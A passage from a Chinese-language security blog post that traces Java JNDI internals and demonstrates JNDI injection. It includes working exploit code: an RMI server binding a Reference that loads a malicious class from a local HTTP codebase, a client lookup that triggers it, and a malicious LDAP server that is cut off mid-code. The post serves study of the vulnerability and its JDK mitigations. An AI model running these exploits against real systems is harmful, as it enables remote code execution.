class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);<br>        System.setProperty(Context.PROVIDER_URL, <span class="hljs-string">&quot;rmi://localhost:1099&quot;</span>);<br><br>        <span class="hljs-comment">//创建一个初始化上下文对象</span><br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br><br>        <span class="hljs-comment">//实例化person对象</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        p.setName(<span class="hljs-string">&quot;Sp4rks&quot;</span>);<br>        p.setPassword(<span class="hljs-string">&quot;PASSWORD!&quot;</span>);<br><br>        <span class="hljs-comment">//person对象绑定到JNDI服务中，JNDI的名字叫做：person</span><br>        initialContext.bind(<span class="hljs-string">&quot;person&quot;</span>, p);<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        initPerson();<br>        <span class="hljs-keyword">synchronized</span> (Server.class) &#123;<br>            Server.class.wait();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
<p>Client类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">findPerson</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">// 创建一个初始化上下文对象</span><br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br><br>        <span class="hljs-comment">//通过lookup查找person对象</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> (Person) initialContext.lookup(<span class="hljs-string">&quot;rmi://localhost:1099/person&quot;</span>);<br><br>        <span class="hljs-comment">//打印出这个对象</span><br>        System.out.println(person.toString());<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        findPerson();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>可以发现与原生的RMI服务不同之处：</p>
<ul>
<li>服务端：纯RMI实现中是调用java.rmi包内的bind()或rebind()方法来直接绑定RMI注册表端口的，而JNDI创建的RMI服务中多的部分就是需要设置<code>INITIAL_CONTEXT_FACTORY</code>和<code>PROVIDER_URL</code>来指定<code>InitialContext</code>的初始化Factory和Provider的URL地址，换句话说就是初始化配置JNDI设置时需要预先指定其上下文环境如指定为RMI服务，最后再调用<code>javax.naming.InitialContext.bind()</code>来将指定对象绑定到RMI注册表中；</li>
<li>客户端：纯RMI实现中是调用java.rmi包内的lookup()方法来检索绑定在RMI注册表中的对象，而JNDI实现的RMI客户端查询是调用<code>javax.naming.InitialContext.lookup()</code>方法来检索的；</li>
</ul>
<p>简单地说，纯RMI实现的方式主要是调用java.rmi这个包来实现绑定和检索的，而JNDI实现的RMI服务则是调用javax.naming这个包即应用命名服务来实现的。其中javax.naming.Context接口提供了抽象方法，对不同服务进行调用的时候，会去调用 xxxContext 这个类，比如调用 RMI 服务的时候就是调的 RegistryContext。</p>
<h1 id="JNDI的底层实现"><a href="#JNDI的底层实现" class="headerlink" title="JNDI的底层实现"></a>JNDI的底层实现</h1><h2 id="Context初始化-获取工厂类部分"><a href="#Context初始化-获取工厂类部分" class="headerlink" title="Context初始化(获取工厂类部分)"></a>Context初始化(获取工厂类部分)</h2><p>我们在初始化上下文打一个断点。</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250122145546331.png" alt="image-20250122145546331"></p>
<p>会走到<code>javax.naming.InitialContext#init</code>，跟进init函数 ，调用了<code>com.sun.naming.internal.ResourceManager#getInitialEnvironment</code>，这段其实还挺麻烦的，但是也不是特别重要，大概意思就是把我们写的<code>System.setProperty(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);</code> 和<code>System.setProperty(Context.PROVIDER_URL, &quot;rmi://localhost:1099&quot;);</code>读出来，变成一个hashtable赋值给myProps，然后myProps就有键值对了，我们着重看getDefaultInitCtx();</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250122142127476.png" alt="image-20250122142127476"></p>
<p>这里首先通过<code>getInitialContextFactoryBuilder()</code>初始化了一个<code>InitialContextFactoryBuilder</code>类。如果该类为空，则将<code>className</code>设置为<code>INITIAL_CONTEXT_FACTORY</code>属性。这个属性就是我们手动设置的RMI上下文工厂类<code>com.sun.jndi.rmi.registry.RegistryContextFactory</code>。</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250122142506517.png" alt="image-20250122142506517"></p>
<p>这里通过<code>loadClass()</code>来动态加载我们设置的工厂类并实例化。最终调用的其实是<code>RegistryContextFactory#getInitialContext()</code>方法，通过我们的设置工厂类来初始化上下文Context。</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250122143222256.png" alt="image-20250122143222256"></p>
<h2 id="Context初始化-获取服务交互所需资源部分"><a href="#Context初始化-获取服务交互所需资源部分" class="headerlink" title="Context初始化(获取服务交互所需资源部分)"></a>Context初始化(获取服务交互所需资源部分)</h2><p>现在JNDI知道了我们想要调用何种服务，那么它又是如何知道服务地址以及获取服务的各种资源的呢？接着我们跟到<code>RegistryContextFactory#getInitialContext()</code>中，其中getInitCtxURL(var1)根据我们传入的Hashtable获取初始上下文的url</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250122144102192.png" alt="image-20250122144102192"></p>
<p>这里的<code>var1</code>就是myProps也就是我们设置的两个环境变量，跟进<code>URLToContext()</code>，接着在<code>URLToContext()</code>方法中初始化了一个<code>rmiURLContextFactory</code>类，并根据服务路径来获取实例。跟进getObjectInstance</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250122144339119.png" alt="image-20250122144339119"></p>
<p>这个类实现了ObjectFactory接口，它会根据不同的输入类型（null、String 或 String[]）来创建不同的对象实例。简单来讲就是根据传入的参数创建并返回一个适当的对象实例，我们这里是String，跟进getUsingURL()</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250122144443180.png" alt="image-20250122144443180"></p>
<p>新建了一个<code>rmiURLContext</code>，随后调用了他的lookup方法</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250122144633337.png" alt="image-20250122144633337"></p>
<p>rmiURLContext没有lookup方法，走到父类<code>com.sun.jndi.toolkit.url.GenericURLContext</code></p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250122145110171.png" alt="image-20250122145110171"></p>
<p>当registryContext调用lookup时候会新创建一个RegistryContext并返回， 创建的时候根据java的类加载，会调用代码块</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250122154834184.png" alt="image-20250122154834184"></p>
<p>所以在最终初始化的时候获取了一系列RMI通信过程中所需的资源，<code>RegistryImpl_Stub</code>、<code>host</code>、<code>port</code>等信息。</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250122145147450.png" alt="image-20250122145147450"></p>
<p>JNDI在初始化上下文的时候获取了与服务交互所需的各种资源，所以下一步就是通过获取的资源和服务愉快地进行交互了。</p>
<h1 id="JNDI协议动态转换"><a href="#JNDI协议动态转换" class="headerlink" title="JNDI协议动态转换"></a>JNDI协议动态转换</h1><p>在编写服务端的代码时，我们手动设置了属性<code>INITIAL_CONTEXT_FACTORY</code>和<code>PROVIDER_URL</code>的值来对Context进行初始化。通过对Context的初始化，JNDI能够识别我们想调用何种服务，以及服务的路径。</p>
<p>但实际上，在 <code>Context#lookup()</code>方法的参数中，用户可以指定自己的查找协议。JNDI会通过用户的输入来动态的识别用户要调用的服务以及路径。来看下面的例子</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250122165147831.png" alt="image-20250122165147831"></p>
<p>可以看到，我们并没有设置相应的环境变量来初始化Context，但是JNDI仍旧通过lookup()的参数识别出了我们要调用的服务以及路径，这就是JNDI的动态协议转换。</p>
<h2 id="动态协议转换的底层实现"><a href="#动态协议转换的底层实现" class="headerlink" title="动态协议转换的底层实现"></a>动态协议转换的底层实现</h2><p>在<code>lookup()</code>打个断点开始跟进</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250122165409571.png" alt="image-20250122165409571"></p>
<p>注意到其实我们不管调用的是lookup、bind或者是其他<code>initalContext</code>中的方法，都会调用<code>getURLOrDefaultInitCtx()</code>方法进行检查。</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250122165504374.png" alt="image-20250122165504374"></p>
<p>跟进<code>getURLOrDefaultInitCtx()</code>方法，会通过<code>getURLScheme()</code>方法来获取通信协议，比如这里获取到的是<code>rmi</code>协议</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250122165749936.png" alt="image-20250122165749936"></p>
<p>接着跟据获取到的协议，通过<code>NamingManager#getURLContext()</code>来调用<code>getURLObject()</code>方法，看名字也知道这是获取RUL对象</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250122165848551.png" alt="image-20250122165848551"></p>
<p>最终在<code>getURLObject()</code>方法中，根据<code>defaultPkgPrefix</code>属性动态生成<code>Factory</code>类</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250122170037396.png" alt="image-20250122170037396"></p>
<p>通过动态协议转换，我们可以仅通过一串特定字符串就可以指定JNDI调用何种服务，十分方便。但是方便是会付出一定代价的。对于一个系统来讲，往往越方便，就越不安全。</p>
<p>假如我们能够控制<code>string</code>字段，那么就可以搭建恶意服务，并控制JNDI接口访问该恶意，于是将导致恶意的远程class文件加载，从而导致远程代码执行。这种攻击手法其实就是JNDI注入，它和RMI服务攻击手法中的”远程加载CodeBase”较为类似，都是通过一些远程通信来引入恶意的class文件，进而导致代码执行。 –<a href="https://goodapple.top/archives/696">Java安全学习——JNDI注入</a></p>
<h1 id="Reference类"><a href="#Reference类" class="headerlink" title="Reference类"></a>Reference类</h1><p><code>Reference</code> 类表示对命名或目录服务之外的对象的引用。(类似于 RMI 中的 <code>codebase</code> 功能)</p>
<p>为了将 <code>Object</code> 对象存储在命名或目录服务中，Java 提供了Naming Reference(命名引用)功能。对象可以通过绑定 <code>Reference</code> 来存储在命名或目录服务下，如 RMI、LDAP 等。</p>
<p>在使用 <code>Reference</code> 时，我们可以直接将对象写入构造方法中，当该对象被调用时，相关的方法将被触发。</p>
<p><code>Reference</code> 类的常用构造函数如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// className 为远程加载时所使用的类名，如果本地找不到该类名，则会去远程加载</span><br><span class="hljs-comment">// factory 为工厂类名</span><br><span class="hljs-comment">// factoryLocation 为工厂类加载的地址，可以是 file://、ftp://、http:// 等协议</span><br>Reference(String className, String factory, String factoryLocation)<br></code></pre></td></tr></table></figure>

<p>在 RMI 中，远程加载的对象需要继承 <code>UnicastRemoteObject</code> 类，所以，我们需要使用 <code>ReferenceWrapper</code> 类来将 <code>Reference</code> 类或其子类对象远程包装为 <code>Remote</code> 类，以便使其能够被远程访问。</p>
<h1 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h1><p>通过以上实例可以清晰的看到看到，如果lookup()函数的访问地址参数控制不当，则有可能导致加载远程恶意类。</p>
<p>JNDI接口可以调用多个含有远程功能的服务，所以我们的攻击方式也多种多样。但流程大同小异，如下图所示</p>
<p><img src="C:\Users\14341\Desktop\Reference-1-1024x492.png" alt="Reference-1-1024x492"></p>
<h2 id="JNDI注入版本号限制总结"><a href="#JNDI注入版本号限制总结" class="headerlink" title="JNDI注入版本号限制总结"></a>JNDI注入版本号限制总结</h2><p>要想成功利用JNDI注入漏洞，重要的前提就是当前Java环境的JDK版本，而JNDI注入中不同的攻击向量和利用方式所被限制的版本号都有点不一样。</p>
<p>这里将所有不同版本JDK的防御都列出来：</p>
<ul>
<li>JDK 6u45、7u21之后：<code>java.rmi.server.useCodebaseOnly</code>的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</li>
<li>JDK 6u141、7u131、8u121之后：增加了<code>com.sun.jndi.rmi.object.trustURLCodebase</code>选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</li>
<li>JDK 6u211、7u201、8u191、11.0.1之后：增加了<code>com.sun.jndi.ldap.object.trustURLCodebase</code>选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</li>
</ul>
<p>由于<code>JNDI</code> 注入动态加载的原理是使用 <code>Reference</code> 引用 <code>ObjectFactory</code> 类。其内部机制通过 <code>URLClassLoader</code> 加载类文件，因此不受 <code>java.rmi.server.useCodebaseOnly=false</code>属性的限制。但是，不可避免地会受到以下配置项的限制：<br><code>com.sun.jndi.rmi.object.trustURLCodebase(禁止 RMI 和 CORBA 协议使用远程 codebase)</code>、<code>com.sun.jndi.ldap.object.trustURLCodebase(禁止 LDAP 协议使用远程 codebase)</code></p>
<h2 id="JNDI-RMI利用方式"><a href="#JNDI-RMI利用方式" class="headerlink" title="JNDI-RMI利用方式"></a>JNDI-RMI利用方式</h2><p>所以综上<code>JNDI-RMI</code> 注入方式有：</p>
<ul>
<li>codebase 利用：JDK 6u141、7u131、8u121之前，通过设置 codebase 属性，利用本地 Class Factory 作为 Reference Factory 来加载远程类文件。</li>
</ul>
<p>我当前的JDK版本为8u65，符合codebase利用方式版本，服务端换为远程引用的写法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initPerson</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//创建一个RMI注册表</span><br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-comment">//配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常</span><br>        System.setProperty(Context.INITIAL_CONTEXT_FACTORY, <span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);<br>        System.setProperty(Context.PROVIDER_URL, <span class="hljs-string">&quot;rmi://localhost:1099&quot;</span>);<br><br>        <span class="hljs-comment">//创建一个初始化上下文对象</span><br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br><br>        <span class="hljs-comment">//实例化person对象</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>        p.setName(<span class="hljs-string">&quot;Sp4rks&quot;</span>);<br>        p.setPassword(<span class="hljs-string">&quot;PASSWORD!&quot;</span>);<br><br>        <span class="hljs-comment">//person对象绑定到JNDI服务中，JNDI的名字叫做：person</span><br>	    <span class="hljs-comment">//initialContext.bind(&quot;person&quot;, p);</span><br><br>		<br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">refObj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;TestRef&quot;</span>,<span class="hljs-string">&quot;TestRef&quot;</span>, <span class="hljs-string">&quot;http://localhost:8888/&quot;</span>);<br>        initialContext.bind(<span class="hljs-string">&quot;rmi://localhost:1099/person&quot;</span>, refObj);<br><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        initPerson();<br>        <span class="hljs-keyword">synchronized</span> (Server.class) &#123;<br>            Server.class.wait();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>同时远程放了一个恶意的class文件，并开启了http服务</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250205180203714.png" alt="image-20250205180203714"></p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250123171554164.png" alt="image-20250123171554164"></p>
<p>有些文章在写恶意类的时候自己加上了UnicastRemoteObject 实际上是不必要的，我们在服务端bind下一个断点，会走到<code>com.sun.jndi.rmi.registry.RegistryContext#bind(javax.naming.Name, java.lang.Object)</code></p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250123173529228.png" alt="image-20250123173529228"></p>
<p>其中会调用<code>encodeObject()</code>方法把Reference对象包装成ReferenceWrapper对象返回。</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250123173554667.png" alt="image-20250123173554667"></p>
<p>客户端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">findPerson</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">// 创建一个初始化上下文对象</span><br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br><br>        <span class="hljs-comment">//通过lookup查找person对象</span><br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> (Person) initialContext.lookup(<span class="hljs-string">&quot;rmi://localhost:1099/person&quot;</span>);<br><br>        <span class="hljs-comment">//打印出这个对象</span><br>        System.out.println(person.toString());<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        findPerson();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p>利用成果</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250123171919657.png" alt="image-20250123171919657"></p>
<p>我们可以看一下流程，在客户端打上断点</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250123173920426.png" alt="image-20250123173920426"></p>
<p>又回到熟悉的<code>getURLOrDefaultInitCtx</code></p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250123174522119.png" alt="image-20250123174522119"></p>
<p>一路跟lookup，跟到<code>com.sun.jndi.rmi.registry.RegistryContext#lookup(javax.naming.Name)</code>，发现这里decodeObject，因为刚刚服务端有一个encodeObject，跟进去</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250123174705684.png" alt="image-20250123174705684"></p>
<p>只要是继承了<code>RemoteReference</code>类，就会调用<code>getObjectInstance</code>方法继续往下处理</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250123174943231.png" alt="image-20250123174943231"></p>
<p>可以看到这里是从引用的变量中获取工厂，调用了<code>getObjectFactoryFromReference</code>方法 ，继续跟进</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250123175105524.png" alt="image-20250123175105524"></p>
<p>这里就开始类加载了，首先会在本地加载，我的类是TestRef，这肯定是没有这个类的，然后利用codebase去找</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250123175706243.png" alt="image-20250123175706243"></p>
<p>跟进下发现最后会调用<code>URLClasserloader</code>去远程加载，相当于就是会去在我们的路径下去找我们的恶意类</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250123175817342.png" alt="image-20250123175817342"></p>
<p>并且后面有实例化的点，所以只要一执行完这个代码就会弹计算器了</p>
<p><img src="C:\Users\14341\AppData\Roaming\Typora\typora-user-images\image-20250123180357714.png" alt="image-20250123180357714"></p>
<h2 id="JNDI-LDAP利用方式"><a href="#JNDI-LDAP利用方式" class="headerlink" title="JNDI-LDAP利用方式"></a>JNDI-LDAP利用方式</h2><p><code>JNDI-LDAP</code>注入方式有：</p>
<ul>
<li>codebase 利用：JDK 6u211、7u201、8u191、JDK 11.0.1之前，通过 LDAP 协议加载远程类文件。</li>
<li>serialize 利用(可以绕过高版本限制，放在后面详细写)：序列化对象注入：通过将恶意序列化对象注入到 LDAP 服务器，当目标应用查询时会反序列化并执行恶意代码；</li>
</ul>
<p>LDAP（Lightweight Directory Access Protocol ，轻型目录访问协议）是一种目录服务协议，它不是JAVA独有的，是一种通用的东西，运行在TCP&#x2F;IP堆栈之上。我们可以尝试使用LDAP服务来存储Java对象，如果我们此时能够控制JNDI去访问存储在LDAP中的Java恶意对象，那么就有可能达到攻击的目的。</p>
<p>Java对象在LDAP目录中也有多种存储形式</p>
<ul>
<li>Java序列化</li>
<li>JNDI Reference</li>
<li>Marshalled对象</li>
<li>Remote Location (已弃用)</li>
</ul>
<p>LDAP可以为存储的Java对象指定多种属性：</p>
<ul>
<li>javaCodeBase</li>
<li>objectClass</li>
<li>javaFactory</li>
<li>javaSerializedData Java 序列化数据</li>
</ul>
<p>我当前的JDK版本为8u141，需要导入unboundid-ldapsdk.jar包伪造LDAP服务:</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.unboundid<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>6.0.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>Ldap服务端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPException;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LdapServer</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1:8888/#TestRef&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">DEFAULT_PORT</span> <span class="hljs-operator">=</span> <span class="hljs-number">1234</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> DEFAULT_URL;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> DEFAULT_PORT;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> createDirectoryServerConfig(LDAP_BASE, port);<br>            <span class="hljs-comment">// 为目录服务器添加操作拦截器，拦截 LDAP 操作并返回恶意的 RCE 引用</span><br>            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url)));<br>            <span class="hljs-comment">// 创建一个目录服务器实例</span><br>            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port);<br>            ds.startListening();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            System.err.println(<span class="hljs-string">&quot;Failed to start LDAP server: &quot;</span> + e.getMessage());<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 创建目录服务器配置的方法</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> InMemoryDirectoryServerConfig <span class="hljs-title function_">createDirectoryServerConfig</span><span class="hljs-params">(String ldapBase, <span class="hljs-type">int</span> port)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(ldapBase);<br>        config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<br>                <span class="hljs-string">&quot;listen&quot;</span>,<br>                InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),<br>                port,<br>                ServerSocketFactory.getDefault(),<br>                SocketFactory.getDefault(),<br>                (SSLSocketFactory) SSLSocketFactory.getDefault()<br>        ));<br>        <span class="hljs-keyword">return</span> config;<br>    &#125;<br><br>    <span class="hljs-comment">// 自定义操作拦截器类，用于拦截 LDAP 操作并返回恶意的 RCE 引用</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> URL codebase;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span><span class="hljs-params">(URL cb)</span> &#123;<br>            <span class="hljs-built_in">this</span>.codebase = cb;<br>        &#125;<br><br>        <span class="hljs-comment">// 处理搜索请求（当有搜索请求时调用此方法）</span><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span><span class="hljs-params">(InMemoryInterceptedSearchResult result)</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> 